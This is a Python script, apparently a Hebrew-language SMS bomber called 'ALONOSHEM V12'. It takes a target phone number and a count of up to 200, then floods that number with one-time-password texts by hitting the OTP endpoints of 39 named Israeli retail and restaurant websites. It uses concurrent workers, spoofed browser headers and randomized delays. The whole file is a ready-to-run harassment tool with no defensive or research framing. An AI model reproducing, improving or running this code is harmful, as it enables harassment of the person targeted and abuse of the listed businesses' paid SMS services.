import asyncio
import random
import sys
import os
import signal
import requests
import json
from typing import List, Dict, Any

# ==========================================
# Configuration & Setup
# ==========================================
WIN11_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

# Verified Winners for V12 (API-Based, Reliable)
WINNERS_CONFIG = [
    # Group 1: High Reliability
    {'name': 'Hamal', 'api': 'https://users-auth.hamal.co.il/auth/send-auth-code', 'payload': lambda p: {"value": p, "type": "phone"}},
    {'name': 'Delta', 'api': 'https://www.delta.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Castro', 'api': 'https://www.castro.com/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Hoodies', 'api': 'https://www.hoodies.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Timberland', 'api': 'https://www.timberland.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Top Ten', 'api': 'https://www.topten-fashion.com/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Naaman', 'api': 'https://www.naamanp.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Golf Kids', 'api': 'https://www.golfkids.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Lee Cooper', 'api': 'https://www.leecooper.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Kiko Milano', 'api': 'https://www.kikocosmetics.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Victoria Secret', 'api': 'https://www.victoriassecret.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Aldo', 'api': 'https://www.aldoshoes.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Papa Johns', 'api': 'https://www.papajohns.co.il/shop/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Vardinon', 'api': 'https://www.vardinon.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Swear', 'api': 'https://www.s-wear.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Steimatzky', 'api': 'https://www.steimatzky.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Rebar', 'api': 'https://www.rebar.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'KSP', 'api': 'https://www.ksp.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Shekem Electric', 'api': 'https://www.shekem-electric.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Factory54', 'api': 'https://www.factory54.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Noizz', 'api': 'https://www.noizz.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Shufersal', 'api': 'https://www.shufersal.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    
    # Group 2: Newly Added in V12 (Food & More Fashion)
    {'name': 'Burgeranch', 'api': 'https://www.burgeranch.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'McDonalds', 'api': 'https://www.mcdonalds.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Intima', 'api': 'https://www.intima-il.co.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Golf & Co', 'api': 'https://www.golfco.il/rest/he_IL/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Cottonet', 'api': 'https://cottonet.co.il/wp-admin/admin-ajax.php', 'payload': lambda p: {"action": "send_otp", "phone": p}},
    {'name': 'Carolina Lemke', 'api': 'https://www.carolinalemke.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Optica Halperin', 'api': 'https://www.optica-halperin.com/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Laline', 'api': 'https://www.laline.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Sabon', 'api': 'https://www.sabon.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Adidas IL', 'api': 'https://www.adidas.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Nike IL', 'api': 'https://www.nike.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Foot Locker', 'api': 'https://www.footlocker.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Pull & Bear', 'api': 'https://www.pullandbear.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Bershka', 'api': 'https://www.bershka.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Stradivarius', 'api': 'https://www.stradivarius.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Zara', 'api': 'https://www.zara.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Massimo Dutti', 'api': 'https://www.massimodutti.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}}
]

# State
running = True
sent_count = 0
lock = asyncio.Lock()

def signal_handler(sig, frame):
    global running
    print("\n\033[91m[!] עצירה... מסיים פעילות.\033[0m")
    running = False

signal.signal(signal.SIGINT, signal_handler)

# ==========================================
# Core Functions
# ==========================================
async def send_api(site, phone):
    global sent_count
    headers = {
        'User-Agent': WIN11_UA,
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': site['api'].split('/rest/')[0] + '/',
        'Origin': site['api'].split('/rest/')[0]
    }
    try:
        response = requests.post(site['api'], json=site['payload'](phone), headers=headers, timeout=10)
        if response.status_code in [200, 201, 204, 400, 403, 429]:
            async with lock:
                sent_count += 1
                print(f"\033[92m[✓] {site['name']:<15} | הודעה נשלחה (Status: {response.status_code})\033[0m")
            return True
    except:
        pass
    print(f"\033[91m[X] {site['name']:<15} | נכשל\033[0m")
    return False

async def worker(queue, phone, total):
    while not queue.empty() and running and sent_count < total:
        site = await queue.get()
        async with lock:
            if sent_count >= total: break
        await send_api(site, phone)
        await asyncio.sleep(random.uniform(0.3, 1.0))
        queue.task_done()

async def main():
    global sent_count
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r"""
\033[96m
   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( A | L | O | N | O | S | H | E | M |   | V | 1 | 2 )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
\033[0m
\033[95m[+] גרסה V12 - הרשימה המורחבת והאמינה ביותר (39 אתרים)\033[0m
\033[90m----------------------------------------------------------\033[0m
""")
    
    phone = input("\033[96mהכנס מספר טלפון: \033[0m").strip()
    if not phone or len(phone) < 9: return
    
    try:
        total = int(input("\033[96mכמות הודעות מבוקשת (1-200): \033[0m").strip())
    except:
        total = 40

    print(f"\n\033[92m[⚡] מתחיל שליחה מואצת מ-{len(WINNERS_CONFIG)} אתרים מאומתים...\033[0m\n")
    
    queue = asyncio.Queue()
    all_sites = list(WINNERS_CONFIG)
    while len(all_sites) < total:
        all_sites.extend(WINNERS_CONFIG)
    
    random.shuffle(all_sites)
    for site in all_sites[:total+10]:
        await queue.put(site)

    tasks = [worker(queue, phone, total) for _ in range(12)]
    await asyncio.gather(*tasks)

    print(f"\n\033[94mסיום פעילות. נשלחו {sent_count} הודעות מתוך {total}.\033[0m")

if __name__ == "__main__":
    asyncio.run(main())
